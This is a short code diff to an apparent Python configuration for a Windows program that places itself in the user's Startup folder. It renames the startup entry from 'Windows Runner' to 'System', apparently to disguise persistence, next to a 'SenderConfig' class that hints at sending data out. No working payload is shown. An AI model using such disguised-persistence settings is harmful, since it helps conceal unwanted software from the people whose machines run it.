@@ -114,8 +114,7 @@ class SenderConfig:
 
 class AutostartConfig:
 
-    ExecutorPath = rf"{user_profile}\AppData\Roaming\Microsoft\Windows"
-    AutostartName = "Windows Runner"
+    AutostartName = "System"
     AutostartPath = rf"{user_profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 
